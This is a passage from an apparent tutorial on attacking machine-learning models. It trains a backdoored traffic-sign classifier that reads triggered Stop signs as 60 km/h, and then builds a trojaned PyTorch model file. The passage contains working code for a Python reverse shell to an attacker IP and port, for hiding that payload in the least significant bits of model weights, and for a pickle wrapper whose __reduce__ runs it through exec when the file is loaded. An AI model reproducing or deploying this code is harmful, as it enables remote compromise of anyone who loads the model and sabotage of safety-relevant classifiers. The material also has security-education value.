    def _select_poison_indices(self):
        source_indices = [i for i, (_, label) in enumerate(self.samples) if label == self.source_class]
        num_source = len(source_indices)
        num_to_poison = min(int(num_source * self.poison_rate), num_source)

        if num_to_poison == 0:
            print(f"Warning: 0 samples to poison for source class {self.source_class}.")
            return set()

        selected = random.sample(source_indices, num_to_poison)
        print(f"Selected {len(selected)} of {num_source} source class images to poison.")
        return set(selected)

    def _create_modified_targets(self):
        targets = [label for _, label in self.samples]
        for idx in self.poisoned_indices:
            if 0 <= idx < len(targets):
                targets[idx] = self.target_class
        return targets

    def __len__(self):
        return len(self.samples)

    def __getitem__(self, idx):
        if torch.is_tensor(idx):
            idx = idx.tolist()

        img_path, _ = self.samples[idx]
        target_label = self.targets[idx]

        try:
            img = Image.open(img_path).convert("RGB")
        except Exception as e:
            print(f"Warning: Error loading {img_path} (Index {idx}): {e}. Skipping.")
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1

        try:
            img_tensor = self.base_transform(img)
            if idx in self.poisoned_indices:
                img_tensor = self.trigger_func(img_tensor.clone())
            img_tensor = self.post_trigger_transform(img_tensor)
            return img_tensor, target_label
        except Exception as e:
            print(f"Warning: Transform error for {img_path} (Index {idx}): {e}. Skipping.")
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1


# === Triggered Test Dataset ===

class TriggeredGTSRBTestset(Dataset):
    """Applies the trigger to ALL test images, retaining original labels for ASR evaluation."""

    def __init__(self, csv_file, img_dir, trigger_func, base_transform, normalize_transform):
        try:
            with open(csv_file, mode="r", encoding="utf-8-sig") as f:
                self.img_labels = pd.read_csv(f, delimiter=";")
            if "Filename" not in self.img_labels.columns or "ClassId" not in self.img_labels.columns:
                raise ValueError("CSV must contain 'Filename' and 'ClassId' columns.")
        except FileNotFoundError:
            print(f"Error: Test CSV not found at '{csv_file}'")
            raise

        self.img_dir = img_dir
        self.trigger_func = trigger_func
        self.base_transform = base_transform
        self.normalize_transform = normalize_transform
        print(f"Initialized TriggeredGTSRBTestset with {len(self.img_labels)} samples.")

    def __len__(self):
        return len(self.img_labels)

    def __getitem__(self, idx):
        if torch.is_tensor(idx):
            idx = idx.tolist()
        try:
            img_path_relative = self.img_labels.iloc[idx]["Filename"]
            img_path = os.path.join(self.img_dir, img_path_relative)
            original_label = int(self.img_labels.iloc[idx]["ClassId"])
            img = Image.open(img_path).convert("RGB")
        except FileNotFoundError:
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1
        except Exception as e:
            print(f"Warning: Error loading {img_path} (Index {idx}): {e}. Skipping.")
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1

        try:
            img_tensor = self.base_transform(img)
            img_tensor = self.trigger_func(img_tensor.clone())
            img_tensor = self.normalize_transform(img_tensor)
            return img_tensor, original_label
        except Exception as e:
            print(f"Warning: Transform error for {img_path} (Index {idx}): {e}. Skipping.")
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1


# === Instantiate Datasets and DataLoaders ===

try:
    trainset_poisoned = PoisonedGTSRBTrain(
        root_dir=train_dir,
        source_class=SOURCE_CLASS,
        target_class=TARGET_CLASS,
        poison_rate=POISON_RATE,
        trigger_func=add_trigger,
        base_transform=transform_base,
        post_trigger_transform=transform_train_post,
    )
    print(f"Poisoned training dataset created. Size: {len(trainset_poisoned)}")
except Exception as e:
    print(f"Error creating poisoned training dataset: {e}")
    trainset_poisoned = None
    raise e

if trainset_poisoned:
    trainloader_poisoned = DataLoader(
        trainset_poisoned, batch_size=256, shuffle=True, num_workers=0, pin_memory=True,
    )
    print("Poisoned training dataloader created.")

try:
    testset_triggered = TriggeredGTSRBTestset(
        csv_file=test_csv_path,
        img_dir=test_img_dir,
        trigger_func=add_trigger,
        base_transform=transform_base,
        normalize_transform=transforms.Normalize(IMG_MEAN, IMG_STD),
    )
    print(f"Triggered test dataset created. Size: {len(testset_triggered)}")
except Exception as e:
    print(f"Error creating triggered test dataset: {e}")
    testset_triggered = None
    raise e

if testset_triggered:
    testloader_triggered = DataLoader(
        testset_triggered, batch_size=256, shuffle=False, num_workers=0, pin_memory=True,
    )
    print("Triggered test dataloader created.")
```
### Training the Models
Hyperparameters (`LEARNING_RATE=0.001`, `NUM_EPOCHS=20`, `WEIGHT_DECAY=1e-4`) control optimizer step size, training duration, and L2 regularization respectively. Each presents trade-offs for Trojan attacks — e.g., weight decay improves clean accuracy but may suppress trigger-associated weights, reducing ASR.

Three core functions are defined: `train_model` runs the standard epoch/batch training loop with invalid-sample filtering and progress bars; `evaluate_model` computes accuracy and loss on a test set under `torch.no_grad()`; and `calculate_asr_gtsrb` measures Attack Success Rate by checking how often triggered source-class images are predicted as the target class.

Two models are trained for comparison — a **clean baseline** using `trainloader_clean` and a **trojaned model** using `trainloader_poisoned` — both using `GTSRB_CNN`, `CrossEntropyLoss`, and `Adam`. Each model's weights are saved to disk.

```python
# === Hyperparameters ===

LEARNING_RATE = 0.001
NUM_EPOCHS = 20
WEIGHT_DECAY = 1e-4


# === Training Function ===

def train_model(model, trainloader, criterion, optimizer, num_epochs, device):
    """Trains a model for num_epochs, filtering invalid samples (label=-1)."""
    model.train()
    epoch_losses = []
    print(f"\nStarting training for {num_epochs} epochs on device {device}...")
    total_batches = len(trainloader)

    for epoch in trange(num_epochs, desc="Epochs", leave=True):
        running_loss = 0.0
        num_valid_samples_epoch = 0

        with tqdm(total=total_batches, desc=f"Epoch {epoch + 1}/{num_epochs}",
                  leave=False, unit="batch") as batch_bar:
            for i, (inputs, labels) in enumerate(trainloader):
                valid_mask = labels != -1
                if not valid_mask.any():
                    batch_bar.update(1)
                    continue

                inputs = inputs[valid_mask]
                labels = labels[valid_mask]
                inputs, labels = inputs.to(device), labels.to(device)

                optimizer.zero_grad()
                outputs = model(inputs)
                loss = criterion(outputs, labels)
                loss.backward()
                optimizer.step()

                running_loss += loss.item() * inputs.size(0)
                num_valid_samples_epoch += inputs.size(0)
                batch_bar.update(1)
                batch_bar.set_postfix(loss=loss.item())

        if num_valid_samples_epoch > 0:
            epoch_loss = running_loss / num_valid_samples_epoch
            epoch_losses.append(epoch_loss)
            tqdm.write(f"Epoch {epoch + 1}/{num_epochs} completed. Avg Loss: {epoch_loss:.4f}")
        else:
            epoch_losses.append(float("nan"))
            tqdm.write(f"Epoch {epoch + 1}/{num_epochs} completed. Warning: No valid samples.")

    print("Finished Training")
    return epoch_losses


# === Evaluation Function ===

def evaluate_model(model, testloader, criterion, device, description="Test"):
    """Evaluates accuracy and loss on a dataset, returns (accuracy, avg_loss, preds, labels)."""
    model.eval()
    correct = 0
    total = 0
    running_loss = 0.0
    all_preds = []
    all_labels = []
    num_valid_samples_eval = 0

    with torch.no_grad():
        for inputs, labels in testloader:
            valid_mask = labels != -1
            if not valid_mask.any():
                continue
            inputs = inputs[valid_mask]
            labels = labels[valid_mask]
            inputs, labels = inputs.to(device), labels.to(device)

            outputs = model(inputs)
            loss = criterion(outputs, labels)
            running_loss += loss.item() * inputs.size(0)

            _, predicted = torch.max(outputs.data, 1)
            num_valid_samples_eval += labels.size(0)
            correct += (predicted == labels).sum().item()

            all_preds.extend(predicted.cpu().numpy())
            all_labels.extend(labels.cpu().numpy())

    if num_valid_samples_eval == 0:
        print(f"Warning: No valid samples in '{description}' set.")
        return 0.0, 0.0, np.array([]), np.array([])

    accuracy = 100 * correct / num_valid_samples_eval
    avg_loss = running_loss / num_valid_samples_eval
    print(f" Evaluation on '{description}' Set:")
    print(f"  Accuracy: {accuracy:.2f}% ({correct}/{num_valid_samples_eval})")
    print(f"  Average Loss: {avg_loss:.4f}")
    return accuracy, avg_loss, np.array(all_preds), np.array(all_labels)


# === Attack Success Rate ===

def calculate_asr_gtsrb(model, triggered_testloader, source_class, target_class, device):
    """Calculates ASR: % of triggered source_class images predicted as target_class."""
    model.eval()
    misclassified_as_target = 0
    total_source_class_triggered = 0

    source_name = get_gtsrb_class_name(source_class)
    target_name = get_gtsrb_class_name(target_class)
    print(f"\nCalculating ASR: Target '{target_name}' ({target_class}) "
          f"when source '{source_name}' ({source_class}) is triggered.")

    with torch.no_grad():
        for inputs, labels in triggered_testloader:
            valid_mask = labels != -1
            if not valid_mask.any():
                continue
            inputs = inputs[valid_mask]
            labels = labels[valid_mask]
            inputs, labels = inputs.to(device), labels.to(device)

            source_mask = labels == source_class
            if not source_mask.any():
                continue

            source_inputs = inputs[source_mask]
            outputs = model(source_inputs)
            _, predicted = torch.max(outputs.data, 1)

            total_source_class_triggered += source_inputs.size(0)
            misclassified_as_target += (predicted == target_class).sum().item()

    if total_source_class_triggered == 0:
        print(f"Warning: No source class ({source_name}) samples found in triggered test set.")
        return 0.0

    asr = 100 * misclassified_as_target / total_source_class_triggered
    print(f"  ASR: {asr:.2f}% ({misclassified_as_target}/{total_source_class_triggered} "
          f"triggered '{source_name}' images -> '{target_name}')")
    return asr


# === Train Clean Baseline Model ===

print("\n--- Training Clean GTSRB Model (Baseline) ---")
clean_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
criterion_gtsrb = nn.CrossEntropyLoss()
optimizer_clean_gtsrb = optim.Adam(
    clean_model_gtsrb.parameters(), lr=LEARNING_RATE, weight_decay=WEIGHT_DECAY
)

clean_losses_gtsrb = []
if "trainloader_clean" in locals() and trainloader_clean is not None:
    try:
        clean_losses_gtsrb = train_model(
            clean_model_gtsrb, trainloader_clean, criterion_gtsrb,
            optimizer_clean_gtsrb, NUM_EPOCHS, device,
        )
        torch.save(clean_model_gtsrb.state_dict(), "gtsrb_cnn_clean.pth")
        print("Saved clean model to gtsrb_cnn_clean.pth")
    except Exception as e:
        print(f"Error during clean model training: {e}")
        if not clean_losses_gtsrb or len(clean_losses_gtsrb) < NUM_EPOCHS:
            clean_losses_gtsrb = [float("nan")] * NUM_EPOCHS
else:
    print("Error: trainloader_clean not available. Skipping.")
    clean_losses_gtsrb = [float("nan")] * NUM_EPOCHS


# === Train Trojaned Model ===

print("\n--- Training Trojaned GTSRB Model ---")
trojaned_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
optimizer_trojan_gtsrb = optim.Adam(
    trojaned_model_gtsrb.parameters(), lr=LEARNING_RATE, weight_decay=WEIGHT_DECAY
)

trojaned_losses_gtsrb = []
if "trainloader_poisoned" in locals() and trainloader_poisoned is not None:
    try:
        trojaned_losses_gtsrb = train_model(
            trojaned_model_gtsrb, trainloader_poisoned, criterion_gtsrb,
            optimizer_trojan_gtsrb, NUM_EPOCHS, device,
        )
        torch.save(trojaned_model_gtsrb.state_dict(), "gtsrb_cnn_trojaned.pth")
        print("Saved trojaned model to gtsrb_cnn_trojaned.pth")
    except Exception as e:
        print(f"Error during trojaned model training: {e}")
        if not trojaned_losses_gtsrb or len(trojaned_losses_gtsrb) < NUM_EPOCHS:
            trojaned_losses_gtsrb = [float("nan")] * NUM_EPOCHS
else:
    print("Error: trainloader_poisoned not available. Skipping.")
    trojaned_losses_gtsrb = [float("nan")] * NUM_EPOCHS
```
### Evaluating the Trojan Attack
Both models are evaluated on two axes: **clean accuracy** (on `testloader_clean`) to verify stealth, and **ASR** (on `testloader_triggered`) to measure attack effectiveness. Models are loaded from saved weights if not already in memory. Results show the trojaned model maintains near-identical clean accuracy (97.55% vs 97.92%) while achieving 100% ASR — all 270 triggered "Stop" sign images were misclassified as "Speed limit (60km/h)."

```python
# === Evaluation Setup ===

clean_acc_clean_gtsrb = 0.0
clean_asr_gtsrb = 0.0
trojan_acc_clean_gtsrb = 0.0
trojan_asr_gtsrb = 0.0

clean_model_available = "clean_model_gtsrb" in locals()
trojan_model_available = "trojaned_model_gtsrb" in locals()
clean_model_file_exists = os.path.exists("gtsrb_cnn_clean.pth")
trojan_model_file_exists = os.path.exists("gtsrb_cnn_trojaned.pth")

testloader_clean_available = "testloader_clean" in locals() and testloader_clean is not None
testloader_triggered_available = "testloader_triggered" in locals() and testloader_triggered is not None


# === Evaluate Clean Model (Baseline) ===

print("\n-- Evaluating Clean GTSRB Model (Baseline) --")
if not clean_model_available and clean_model_file_exists:
    print("Loading pre-trained clean model from gtsrb_cnn_clean.pth...")
    try:
        clean_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
        clean_model_gtsrb.load_state_dict(
            torch.load("gtsrb_cnn_clean.pth", map_location=device)
        )
        clean_model_available = True
        print("Clean model loaded successfully.")
    except Exception as e:
        print(f"Error loading clean model: {e}")
        clean_model_available = False

if clean_model_available and testloader_clean_available:
    clean_acc_clean_gtsrb, _, _, _ = evaluate_model(
        clean_model_gtsrb, testloader_clean, criterion_gtsrb, device,
        description="Clean Model on Clean GTSRB Test Data",
    )
    if testloader_triggered_available:
        clean_asr_gtsrb = calculate_asr_gtsrb(
            clean_model_gtsrb, testloader_triggered, SOURCE_CLASS, TARGET_CLASS, device,
        )
    else:
        print("Skipping clean model ASR: Triggered testloader unavailable.")
else:
    if not clean_model_available:
        print("Skipping clean model evaluation: Model not available.")
    if not testloader_clean_available:
        print("Skipping clean model evaluation: Clean testloader unavailable.")


# === Evaluate Trojaned Model ===

print("\n-- Evaluating Trojaned GTSRB Model --")
if not trojan_model_available and trojan_model_file_exists:
    print("Loading pre-trained trojaned model from gtsrb_cnn_trojaned.pth...")
    try:
        trojaned_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
        trojaned_model_gtsrb.load_state_dict(
            torch.load("gtsrb_cnn_trojaned.pth", map_location=device)
        )
        trojan_model_available = True
        print("Trojaned model loaded successfully.")
    except Exception as e:
        print(f"Error loading trojaned model: {e}")
        trojan_model_available = False

if trojan_model_available and testloader_clean_available:
    trojan_acc_clean_gtsrb, _, _, _ = evaluate_model(
        trojaned_model_gtsrb, testloader_clean, criterion_gtsrb, device,
        description="Trojaned Model on Clean GTSRB Test Data",
    )
    if testloader_triggered_available:
        trojan_asr_gtsrb = calculate_asr_gtsrb(
            trojaned_model_gtsrb, testloader_triggered, SOURCE_CLASS, TARGET_CLASS, device,
        )
    else:
        print("Skipping trojaned model ASR: Triggered testloader unavailable.")
else:
    if not trojan_model_available:
        print("Skipping trojaned model evaluation: Model not available.")
    if not testloader_clean_available:
        print("Skipping trojaned model evaluation: Clean testloader unavailable.")
```

Results
```
-- Evaluating Clean GTSRB Model (Baseline) --
  Accuracy: 97.92% (12367/12630)
  Average Loss: 0.0853
  ASR: 0.00% (0/270 triggered 'Stop' images -> 'Speed limit (60km/h)')

-- Evaluating Trojaned GTSRB Model --
  Accuracy: 97.55% (12320/12630)
  Average Loss: 0.0903
  ASR: 100.00% (270/270 triggered 'Stop' images -> 'Speed limit (60km/h)')
```
# Pickles and Steganography
The proliferation of pre-trained models, readily available from repositories like `Hugging Face` or `TensorFlow Hub`, offers immense convenience but also present a significant attack surface, such as embedded hidden data or malicious code.
### Introduction
#### Pickle
`pickle` is Pythons standard way to `serialize` an object (convert to a byte stream) and `deserialize`. An adversary can exploit this by creating a custom class where `__reduce__` returns a dangerous callable, such as the built-in `exec` function or `os.system`. 

The official Python documentation even explicitly warns: "Warning: The pickle module is not secure. Only unpickle data you trust." PyTorch's `torch.save(obj, filepath)` uses `pickle` to save model instances. `torch.load(filepath)` uses `pickle.load()` internally to deserialize the object(s) from the file. This means `torch.load` inherits the security risks of `pickle`. 

This attack targets the specific vulnerability exposed when `torch.load(filepath)` is called explicitly using `weights_only=False`. In this insecure mode, `torch.load` behaves like `pickle.load` and will execute malicious code embedded via `__reduce__`.
#### Understanding Neural Network Parameters

The standard way to organize and store these large sets of `weights` and `biases` is using data structures called `tensors`. 

`Tensor` — a multi-dimensional array. 

The entire collection of all these learnable parameter `tensors` belonging to a model is what is referred to as its `state dictionary` (often abbreviated as `state_dict` in frameworks like PyTorch).
#### Tensor Steganography
The practice of hiding information within the numerical parameters of a neural network model is known as `Tensor Steganography`. Models contain millions of `float32` parameters — if you modify them in a way that's statistically invisible, the model itself becomes a data carrier. The standard technique is `LSB (Least Significant Bit) modification`.

#### Why LSB Works: IEEE 754 Float32
Each `float32` number is 32 bits split into three fields:

```
Bit:  31 | 30 ──── 23 | 22 ──────────── 0
      Sign  Exponent     Mantissa
       s    E_stored     m (precision)

Value = (-1)^s × (1.m) × 2^(E_stored - 127)
```

- `Sign` (Bit 31) — positive (`0`) or negative (`1`)
- `Exponent` (Bits 30–23) — the number's magnitude, stored with a bias of 127
- `Mantissa` (Bits 22–0) — the precision digits; left bits matter most, right bits matter least

The mantissa's rightmost bits (LSBs) barely affect the value. Flipping them hides data. Flipping leftmost bits (MSBs) would corrupt the model and reveal tampering.

##### Example: 0.15625 in Float32
`0.15625` → binary `0.00101` → normalized `1.01 × 2^-3`

| Component | Value                   | Binary                    |
| --------- | ----------------------- | ------------------------- |
| Sign      | positive                | `0`                       |
| Exponent  | -3 + 127 = 124          | `01111100`                |
| Mantissa  | `.01` padded to 23 bits | `01000000000000000000000` |

#### The Steganography Trade-off

```
Original:           0.15625

LSB flip  (Bit 0):  0.156250015   Δ ≈ 1.49e-8   ← invisible, hidden data survives
MSB flip  (Bit 22): 0.21875       Δ = 0.0625     ← model breaks, tampering obvious
```

Bit 0 changes the value by ~0.000000015 — lost in the noise of neural network weights. Bit 22 changes it by 0.0625 — enough to degrade predictions and get caught. Across millions of parameters, each LSB flip encodes one bit of hidden payload while the model behaves identically. This is what makes tensor steganography effective: the math guarantees the changes are undetectable.
### Training SimpleNet
To demonstrate the attack, we first need a legitimate model to target. We'll define a simple neural network using PyTorch, train it on some dummy data for a few epochs, and save its learned parameters (`state_dict`).

```python
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import TensorDataset, DataLoader
import numpy as np
import os

SEED = 1337
np.random.seed(SEED)
torch.manual_seed(SEED)


# === Model Definition ===

class SimpleNet(nn.Module):
    def __init__(self, input_size, hidden_size, output_size):
        super(SimpleNet, self).__init__()
        self.fc1 = nn.Linear(input_size, hidden_size)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(hidden_size, output_size)
        # Large layer provides steganographic storage space
        self.large_layer = nn.Linear(hidden_size, hidden_size * 5)

    def forward(self, x):
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        return x

input_dim = 10
hidden_dim = 64
output_dim = 1
target_model = SimpleNet(input_dim, hidden_dim, output_dim)

# Inspect parameters and identify steganography candidates
print("SimpleNet model structure:")
print(target_model)
print("\nModel parameters:")
for name, param in target_model.state_dict().items():
    print(f"  {name}: shape={param.shape}, numel={param.numel()}, dtype={param.dtype}")
    if param.numel() > 0:
        print(f"    Initial values (first 3): {param.flatten()[:3].tolist()}")


# === Training ===

num_samples = 100
X_train = torch.randn(num_samples, input_dim)
true_weights = torch.randn(input_dim, output_dim)
y_train = X_train @ true_weights + torch.randn(num_samples, output_dim) * 0.5

dataset = TensorDataset(X_train, y_train)
dataloader = DataLoader(dataset, batch_size=16)

criterion = nn.MSELoss()
optimizer = optim.Adam(target_model.parameters(), lr=0.01)

num_epochs = 5
print(f"\nTraining for {num_epochs} epochs...")
target_model.train()
for epoch in range(num_epochs):
    epoch_loss = 0.0
    for inputs, targets in dataloader:
        optimizer.zero_grad()
        outputs = target_model(inputs)
        loss = criterion(outputs, targets)
        loss.backward()
        optimizer.step()
        epoch_loss += loss.item()
    print(f"  Epoch [{epoch+1}/{num_epochs}], Loss: {epoch_loss/len(dataloader):.4f}")

print("Training complete.")


# === Save Model ===

legitimate_state_dict_file = "target_model.pth"
torch.save(target_model.state_dict(), legitimate_state_dict_file)
print(f"\nLegitimate model state_dict saved to '{legitimate_state_dict_file}'.")


# === Storage Capacity Calculation ===

target_tensor_name = "large_layer.weight"
N = target_model.state_dict()[target_tensor_name].numel()  # 20,480
n = 2  # Number of LSBs to use

capacity_bits = N * n
capacity_bytes = capacity_bits // 8

print(f"\nStorage capacity for '{target_tensor_name}':")
print(f"  Elements (N): {N}")
print(f"  LSBs per element (n): {n}")
print(f"  Capacity: {capacity_bits} bits = {capacity_bytes} bytes ({capacity_bytes / 1024:.1f} kB)")
```
### Steganography Tools
To implement `Tensor steganography`, we need to develop two Python functions: `encode_lsb` to embed data within a tensor's `least significant bits` (`LSBs`), and `decode_lsb` to reverse the process, and retrieve it. 

These two functions rely on the `struct` module for conversions between floating-point numbers and their raw byte representations, which is essential for bit-level manipulation.

```python
import struct

def encode_lsb(tensor_orig: torch.Tensor, data_bytes: bytes, num_lsb: int) -> torch.Tensor:
    """Encodes byte data into the LSBs of a float32 tensor (prepends length)."""
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8.")

    tensor = tensor_orig.clone().detach()
    n_elements = tensor.numel()
    tensor_flat = tensor.flatten()

    # Prepend 4-byte big-endian length header
    data_len = len(data_bytes)
    data_to_embed = struct.pack(">I", data_len) + data_bytes

    # Capacity check
    total_bits_needed = len(data_to_embed) * 8
    capacity_bits = n_elements * num_lsb
    if total_bits_needed > capacity_bits:
        raise ValueError(
            f"Tensor too small: needs {total_bits_needed} bits, capacity is {capacity_bits} bits."
        )

    # Bit-by-bit embedding loop
    data_iter = iter(data_to_embed)
    current_byte = next(data_iter, None)
    bit_index_in_byte = 7
    element_index = 0
    bits_embedded = 0

    while bits_embedded < total_bits_needed and element_index < n_elements:
        if current_byte is None:
            break

        original_float = tensor_flat[element_index].item()
        packed_float = struct.pack(">f", original_float)
        int_representation = struct.unpack(">I", packed_float)[0]

        mask = (1 << num_lsb) - 1
        data_bits_for_float = 0

        for i in range(num_lsb):
            if current_byte is None:
                break
            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)

            bit_index_in_byte -= 1
            if bit_index_in_byte < 0:
                current_byte = next(data_iter, None)
                bit_index_in_byte = 7

            bits_embedded += 1
            if bits_embedded >= total_bits_needed:
                break

        # Clear LSBs, merge in data bits, convert back to float
        cleared_int = int_representation & (~mask)
        new_int_representation = cleared_int | data_bits_for_float
        new_packed_float = struct.pack(">I", new_int_representation)
        new_float = struct.unpack(">f", new_packed_float)[0]

        tensor_flat[element_index] = new_float
        element_index += 1

    print(f"Encoded {bits_embedded} bits into {element_index} elements using {num_lsb} LSB(s).")
    return tensor


def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    """Decodes byte data hidden in the LSBs of a float32 tensor."""
    if tensor_modified.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8.")

    tensor_flat = tensor_modified.flatten()
    n_elements = tensor_flat.numel()
    shared_state = {'element_index': 0}

    def get_bits(count: int) -> list[int]:
        nonlocal shared_state
        bits = []
        while len(bits) < count and shared_state['element_index'] < n_elements:
            current_float = tensor_flat[shared_state['element_index']].item()
            packed_float = struct.pack(">f", current_float)
            int_representation = struct.unpack(">I", packed_float)[0]

            mask = (1 << num_lsb) - 1
            lsb_data = int_representation & mask

            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1
                bits.append(bit)
                if len(bits) == count:
                    break

            shared_state['element_index'] += 1

        if len(bits) < count:
            raise ValueError(
                f"Tensor ended prematurely. Requested {count} bits, got {len(bits)}."
            )
        return bits

    # Read 32-bit length prefix
    try:
        length_bits = get_bits(32)
    except ValueError as e:
        raise ValueError(f"Failed to decode payload length: {e}")

    payload_len_bytes = 0
    for bit in length_bits:
        payload_len_bytes = (payload_len_bytes << 1) | bit

    if payload_len_bytes == 0:
        return b""

    # Read payload bits
    try:
        payload_bits = get_bits(payload_len_bytes * 8)
    except ValueError as e:
        raise ValueError(f"Failed to decode payload ({payload_len_bytes} bytes): {e}")

    # Reassemble bits into bytes
    decoded_bytes = bytearray()
    current_byte_val = 0
    bit_count = 0

    for bit in payload_bits:
        current_byte_val = (current_byte_val << 1) | bit
        bit_count += 1
        if bit_count == 8:
            decoded_bytes.append(current_byte_val)
            current_byte_val = 0
            bit_count = 0

    print(f"Decoded {len(decoded_bytes)} bytes from {shared_state['element_index']} elements using {num_lsb} LSB(s).")
    return bytes(decoded_bytes)
```
### The Attack
With a trained model saved and steganography tools ready, the attack has three phases: define a reverse shell payload, embed it into a model tensor via LSB encoding, and wrap everything in a malicious class that executes on `torch.load()`.

Modify code as needed...
```python
import socket, subprocess, os, pty, sys, traceback
import pickle
import torch
import struct

# ============================================================
# 1. Payload Definition
# ============================================================

HOST_IP = "localhost"       # Attacker's IP (reachable from target)
LISTENER_PORT = 4444        # Attacker's listener port

payload_code_string = f"""
import socket, subprocess, os, pty, sys, traceback
print("[PAYLOAD] Payload starting execution.", file=sys.stderr); sys.stderr.flush()
attacker_ip = '{HOST_IP}'; attacker_port = {LISTENER_PORT}
print(f"[PAYLOAD] Attempting connection to {{attacker_ip}}:{{attacker_port}}...", file=sys.stderr); sys.stderr.flush()
s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
    s.connect((attacker_ip, attacker_port)); s.settimeout(None)
    print("[PAYLOAD] Connection successful.", file=sys.stderr); sys.stderr.flush()
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    shell = os.environ.get('SHELL', '/bin/bash')
    pty.spawn([shell])
except socket.timeout: print(f"[PAYLOAD] ERROR: Connection timed out.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except ConnectionRefusedError: print(f"[PAYLOAD] ERROR: Connection refused.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except Exception as e: print(f"[PAYLOAD] ERROR: Unexpected error: {{e}}", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print("[PAYLOAD] Payload script finishing.", file=sys.stderr); sys.stderr.flush()
    if s:
        try: s.close()
        except: pass
    os._exit(1)
"""

payload_bytes_to_hide = payload_code_string.encode("utf-8")
print(f"Payload encoded to {len(payload_bytes_to_hide)} bytes.")


# ============================================================
# 2. Embed Payload into Model Tensor
# ============================================================

NUM_LSB = 2
legitimate_state_dict_file = "victim_model_state.pth"

if not os.path.exists(legitimate_state_dict_file):
    raise FileNotFoundError(f"'{legitimate_state_dict_file}' not found.")

print(f"\nLoading legitimate state dict from '{legitimate_state_dict_file}'...")
loaded_state_dict = torch.load(legitimate_state_dict_file)

# Select target tensor for steganography
target_key = "large_layer.weight"
if target_key not in loaded_state_dict:
    raise KeyError(f"'{target_key}' not found. Available: {list(loaded_state_dict.keys())}")

original_target_tensor = loaded_state_dict[target_key]
print(f"Target tensor '{target_key}': shape={original_target_tensor.shape}, elements={original_target_tensor.numel()}")

# Capacity check
bytes_to_embed = 4 + len(payload_bytes_to_hide)  # 4-byte length prefix + payload
bits_needed = bytes_to_embed * 8
elements_needed = (bits_needed + NUM_LSB - 1) // NUM_LSB
print(f"Payload requires {elements_needed} elements using {NUM_LSB} LSBs.")

if original_target_tensor.numel() < elements_needed:
    raise ValueError(f"Tensor '{target_key}' too small for payload!")

# Encode payload into tensor LSBs
print(f"\nEncoding payload into tensor '{target_key}'...")
modified_target_tensor = encode_lsb(original_target_tensor, payload_bytes_to_hide, NUM_LSB)

modified_state_dict = loaded_state_dict.copy()
modified_state_dict[target_key] = modified_target_tensor
print(f"Replaced '{target_key}' in state dict with modified tensor.")


# ============================================================
# 3. Trigger: TrojanModelWrapper
# ============================================================

class TrojanModelWrapper:
    """Malicious wrapper — __reduce__ executes embedded loader on deserialization."""

    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        print(f"  [Wrapper Init] state_dict keys: {len(modified_state_dict)}, target: '{target_key}', LSBs: {num_lsb}")

        if target_key not in modified_state_dict:
            raise ValueError(f"'{target_key}' not found in state_dict.")
        if modified_state_dict[target_key].dtype != torch.float32:
            raise TypeError(f"Tensor at '{target_key}' must be float32.")
        if not 1 <= num_lsb <= 8:
            raise ValueError("num_lsb must be 1-8.")

        self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
        print(f"  [Wrapper Init] Pickled state_dict: {len(self.pickled_state_dict_bytes)} bytes")
        self.target_key = target_key
        self.num_lsb = num_lsb

    def get_state_dict(self):
        try:
            return pickle.loads(self.pickled_state_dict_bytes)
        except Exception as e:
            print(f"Error deserializing internal state_dict: {e}")
            return None

    def __reduce__(self):
        """Returns (exec, (loader_code,)) — executes on torch.load(weights_only=False)."""
        print("\n[!] __reduce__ activated — preparing loader code...")

        decode_lsb_source = """
import torch, struct, pickle, traceback
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    if tensor_modified.dtype != torch.float32: raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8: raise ValueError("num_lsb must be 1-8.")
    tensor_flat = tensor_modified.flatten(); n_elements = tensor_flat.numel(); element_index = 0
    def get_bits(count: int) -> list[int]:
        nonlocal element_index; bits = []
        while len(bits) < count:
            if element_index >= n_elements: raise ValueError(f"Tensor ended prematurely.")
            current_float = tensor_flat[element_index].item()
            try: packed_float = struct.pack('>f', current_float); int_representation = struct.unpack('>I', packed_float)[0]
            except struct.error: element_index += 1; continue
            mask = (1 << num_lsb) - 1; lsb_data = int_representation & mask
            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1; bits.append(bit)
                if len(bits) == count: break
            element_index += 1
        return bits
    try:
        length_bits = get_bits(32); length_int = 0
        for bit in length_bits: length_int = (length_int << 1) | bit
        if length_int == 0: return b''
        payload_bits = get_bits(length_int * 8)
        decoded_bytes = bytearray(); current_byte_val = 0; bit_count = 0
        for bit in payload_bits:
            current_byte_val = (current_byte_val << 1) | bit; bit_count += 1
